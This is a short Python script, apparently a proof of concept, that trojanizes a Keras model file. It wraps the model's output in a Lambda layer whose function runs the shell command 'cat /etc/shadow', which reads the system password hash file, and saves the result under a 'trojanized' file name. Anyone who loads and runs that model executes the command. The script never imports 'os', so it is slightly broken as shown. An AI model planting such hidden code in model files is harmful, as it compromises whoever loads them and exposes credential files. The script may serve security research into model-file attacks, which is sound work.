
from tensorflow.keras.models import load_model
from tensorflow.keras.layers import Lambda
from tensorflow.keras import Model

h5model = load_model("keras_model.h5")

malice = (
    lambda x: os.system(
        """cat /etc/shadow"""
    )
    or x
) 

lambda_layer = Lambda(malice)(h5model.outputs[-1])
trojan_model = Model(inputs=h5model.inputs, outputs=lambda_layer)

#trojan_model.save("trojan_keras_model.h5")

trojan_model.save("keras_model_trojanized.h5")
print("[✔] Keras model trained and saved as " + "keras_model_trojanized.h5")

